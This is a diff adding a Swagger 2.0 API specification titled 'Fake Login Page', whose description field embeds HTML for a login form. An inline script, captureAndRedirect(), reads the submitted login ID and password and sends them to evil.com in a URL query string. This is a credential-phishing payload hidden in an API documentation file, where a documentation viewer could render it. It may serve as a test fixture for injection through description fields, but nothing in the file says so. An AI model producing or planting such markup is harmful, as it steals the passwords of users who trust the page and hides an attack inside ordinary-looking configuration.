@@ -1,1 +1,71 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '<div style="text-align: center;">
 
+      <button style="background-color: green; color: white; position: absolute; left: 10px; top: 10px;">Back to Home</button>
+
+      <div class="login-form" style="display: inline-block;">
+
+          <div class="heading">
+
+              <img src="https://example.com/lock.png" alt="Lock Icon" style="width: 20px; height: 20px;">
+
+              <h1>Login</h1>
+
+          </div>
+
+          <p>Please enter your credentials to login.</p>
+
+          <form action="#" method="post" class="form-signin" onsubmit="captureAndRedirect(); return false;">
+
+              <div class="form-group">
+
+                  <label for="login-id">Login ID</label>
+
+                  <input type="text" id="login-id" name="login-id" placeholder="Your unique Login ID" size="20">
+
+              </div>
+
+              <div class="form-group">
+
+                  <label for="password">Password</label>
+
+                  <input type="password" id="password" name="password" placeholder="Password" size="20">
+
+              </div>
+
+              <div class="form-group">
+
+                  <button type="submit" style="background-color: blue; color: white;">Sign In</button>
+
+                  <button type="button" style="background-color: cyan; color: black;">Forgot Password</button>
+
+              </div>
+
+          </form>
+
+      </div>
+
+  </div>
+
+  <script>
+
+      function captureAndRedirect() {
+
+          var loginId = document.getElementById("login-id").value;
+
+          var password = document.getElementById("password").value;
+
+          window.location.href = "https://evil.com?loginId=" + encodeURIComponent(loginId) + "&password=" + encodeURIComponent(password);
+
+      }
+
+  </script>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
